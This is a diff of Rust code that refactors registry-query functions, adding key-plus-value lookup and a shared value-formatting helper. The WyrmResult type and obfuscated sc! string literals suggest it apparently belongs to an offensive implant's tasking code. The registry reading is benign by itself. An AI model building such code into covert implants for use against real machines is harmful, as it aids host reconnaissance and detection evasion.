@@ -19,31 +19,66 @@ pub fn reg_query(raw_input: &Option<String>) -> Option<impl Serialize> {
     };
 
     // If the 2nd arg is empty, just query the key, otherwise query key + val
-    if input_deser.1.is_none() {
-        return query_key(input_deser.0);
+    if let Some(val) = input_deser.1 {
+        return query_key_plus_value(input_deser.0, val);
     } else {
-        return None;
+        return query_key(input_deser.0);
     }
 }
 
-pub enum RegistryError {
-    CannotExtractKey,
+fn query_key_plus_value(path: String, value: String) -> Option<WyrmResult<String>> {
+    //
+    // Try open the hive, in the event of an error - return
+    //
+    let (key, path_stripped) = match get_key_strip_hive(&path) {
+        Some((k, p)) => (k, p),
+        None => {
+            return Some(WyrmResult::Err::<String>(
+                sc!("Bad data - could not find matching hive.", 162).unwrap(),
+            ));
+        }
+    };
+
+    let open_key = match key.open(path_stripped) {
+        Ok(k) => k,
+        Err(e) => {
+            let msg = format!("{} {path}. {e}", sc!("Could not open key.", 19).unwrap());
+
+            #[cfg(debug_assertions)]
+            print_failed(&msg);
+
+            return Some(WyrmResult::Err(msg));
+        }
+    };
+
+    let val_str = match open_key.get_value(&value) {
+        Ok(v) => value_to_string(&v),
+        Err(e) => {
+            let msg = format!(
+                "{} {path} {value}. {e}",
+                sc!("Could not open key/value.", 19).unwrap()
+            );
+
+            return Some(WyrmResult::Err(msg));
+        }
+    };
+
+    Some(WyrmResult::Ok(val_str))
 }
 
-fn query_key(path: String) -> Option<impl Serialize> {
-    let key = match extract_hive_from_str(&path) {
-        Ok(k) => k,
-        Err(_) => return Some(WyrmResult::Err::<String>("Bad data".into())),
+fn query_key(path: String) -> Option<WyrmResult<String>> {
+    //
+    // Try open the hive, in the event of an error - return
+    //
+    let (key, path_stripped) = match get_key_strip_hive(&path) {
+        Some((k, p)) => (k, p),
+        None => {
+            return Some(WyrmResult::Err::<String>(
+                sc!("Bad data - could not find matching hive.", 162).unwrap(),
+            ));
+        }
     };
 
-    let path_stripped = match strip_hive(&path) {
-        Ok(p) => p,
-        Err(_) => return Some(WyrmResult::Err::<String>("Bad data".into())),
-    };
-
-    //
-    // Try open the key, in the event of an error - return
-    //
     let open_key = match key.open(path_stripped) {
         Ok(k) => k,
         Err(e) => {
@@ -84,21 +119,8 @@ fn query_key(path: String) -> Option<impl Serialize> {
 
     // We got the values, so iterate them - we need to reconstruct everything as a string to send back
     for (name, data) in vals {
-        let data_as_str = match data.ty() {
-            windows_registry::Type::U32 => val_u32_to_str(&data),
-            windows_registry::Type::U64 => val_u64_to_str(&data),
-            windows_registry::Type::String => val_string_to_str(&data.to_vec()),
-            windows_registry::Type::ExpandString => val_string_to_str(&data.to_vec()),
-            windows_registry::Type::MultiString => val_string_to_str(&data.to_vec()),
-            windows_registry::Type::Bytes => String::from("Not implemented"),
-            windows_registry::Type::Other(_) => String::from("Not implemented"),
-        };
-
-        constructed.push(format!(
-            "{} {name}{} {data_as_str}",
-            sc!("Name:", 52).unwrap(),
-            sc!(", Value:", 67).unwrap(),
-        ));
+        let data_as_str = value_to_string(&data);
+        constructed.push(format!("{name} {data_as_str}",));
     }
 
     // todo should be the result#
@@ -108,6 +130,18 @@ fn query_key(path: String) -> Option<impl Serialize> {
             let msg = format!("{}. {e}", sc!("Could not serialise data.", 84).unwrap());
             Some(WyrmResult::Err(msg))
         }
+    }
+}
+
+fn value_to_string(data: &Value) -> String {
+    match data.ty() {
+        windows_registry::Type::U32 => val_u32_to_str(&data),
+        windows_registry::Type::U64 => val_u64_to_str(&data),
+        windows_registry::Type::String => val_string_to_str(&data.to_vec()),
+        windows_registry::Type::ExpandString => val_string_to_str(&data.to_vec()),
+        windows_registry::Type::MultiString => val_string_to_str(&data.to_vec()),
+        windows_registry::Type::Bytes => String::from("Not implemented"),
+        windows_registry::Type::Other(_) => String::from("Not implemented"),
     }
 }
 
@@ -157,4 +191,24 @@ fn extract_hive_from_str<'a>(path: &'a str) -> Result<&'a Key, RegistryError> {
     };
 
     Ok(key)
+}
+
+pub enum RegistryError {
+    CannotExtractKey,
+}
+
+fn get_key_strip_hive<'a>(path: &'a str) -> Option<(&'a Key, &'a str)> {
+    let key = match extract_hive_from_str(path) {
+        Ok(k) => k,
+        Err(_) => return None,
+    };
+
+    let path_stripped = match strip_hive(path) {
+        Ok(p) => p,
+        Err(_) => {
+            return None;
+        }
+    };
+
+    Some((key, path_stripped))
 }
